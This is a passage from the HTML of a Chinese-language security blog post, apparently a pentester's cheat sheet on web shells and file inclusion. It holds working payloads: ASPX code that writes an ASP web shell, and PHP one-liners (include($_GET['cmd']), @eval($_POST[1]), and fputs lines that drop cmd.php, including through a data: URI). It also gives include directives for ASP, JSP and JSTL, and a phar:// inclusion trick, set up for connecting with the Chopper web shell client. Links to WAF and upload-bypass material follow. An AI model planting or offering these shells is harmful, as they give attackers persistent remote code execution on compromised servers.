+StreamWriter file1= File.CreateText(context.Server.MapPath(&#34;root.asp&#34;));
+file1.Write(&#34;&lt;%response.clear:execute request(\&#34;root\&#34;):response.End%&gt;&#34;);
+file1.Flush();
+file1.Close();
+}
+public bool IsReusable {
+get {
+return false;
+}
+}
+}
+%&gt;</pre></td></tr></table>
+</div>
+</div>
+<h2 id="文件包含">文件包含</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">一
+    &lt;?php include ($_GET[&#39;cmd&#39;]);?&gt;         include.php
+    &lt;?php @eval($_POST[1]);?&gt;               1.txt
+        include.php?cmd=1.txt               菜刀连接
+    &lt;?php fputs(fopen(&#39;cmd.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[1]);?&gt;&#39;)?&gt;  2.txt
+        include.php?cmd=2.txt               生成cmd.php
+
+    include.php?cmd=data:text/plain,&lt;?php fputs(fopen(&#39;cmd1.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[1]);?&gt;&#39;)?&gt;                 协议生成cmd1.php
+
+二
+
+    &lt;?php Include(&#34;上传的txt文件路径&#34;);?&gt;              #PHP
+    &lt;!--#include file=&#34;上传的txt文件路径&#34; --&gt;          #ASP
+    &lt;!--#include file=&#34;上传的txt文件路径&#34; --&gt;          #ASPX
+    &lt;jsp:inclde page=&#34;上传的txt文件路径&#34;/&gt;             #JSP
+    &lt;%@include file=&#34;上传的txt文件路径&#34;%&gt;
+    &lt;c:import url=&#34;上传的txt文件路径&#34;&gt;                 #JSTL
+
+三  &lt;?php include &#39;phar://1.rar/1.txt&#39;;?&gt;       访问后再访问/1/1.txt即可</pre></td></tr></table>
+</div>
+</div>
+<h2 id="编辑器绕过-https-navisec-it-e7-bc-96-e8-be-91-e5-99-a8-e6-bc-8f-e6-b4-9e-e6-89-8b-e5-86-8c"><a href="https://navisec.it/%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%89%8B%E5%86%8C/">编辑器绕过</a></h2>
+
+<p>下载地址:<br />
+<a href="https://img.04z.net/img/editor1.pdf">PDF1下载</a></p>
+
+<p><a href="https://img.04z.net/img/editor.pdf">PDF2下载</a></p>
+
+<hr />
+
+<p>其他资料:<br />
+<a href="http://cracer.com/?p=350">绕waf资料</a></p>
+
+<p><a href="http://www.freebuf.com/articles/web/18084.html">WAF基础了解</a></p>
+
+<p><a href="http://blog.csdn.net/u011066706/article/details/51175401?locationNum=11">NTFS-ADS流文件</a></p>
+
+<p><a href="http://www.cnnetarmy.com/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/">文件上传绕过姿势总结</a></p>
+
+    </div>
+
+    
+<footer class="post-footer">
+      
+      <nav class="post-nav">
+        <a class="prev" href="/post/dll-attack/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">DLL-Attack</span>
+            <span class="prev-text nav-mobile">Prev</span>
+          </a>
+        <a class="next" href="/post/powershell-meterpreter-tips/">
+            <span class="next-text nav-default">Powershell-meterpreter-tips</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+<script type="text/javascript" src="/dist/even.ae3e3272.min.js"></script>
+  <script type="text/javascript">
+    window.MathJax = {
+      tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]},
+      showProcessingMessages: false,
+      messageStyle: 'none'
+    };
+  </script>
+  <script async src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/MathJax.js?config=TeX-MML-AM_CHTML"  integrity="sha256-nvJJv9wWKEm88qvoQl9ekL2J+k/RWIsaSScxxlsrv8k=" crossorigin="anonymous"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-153178075-1', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</body>
+</html>
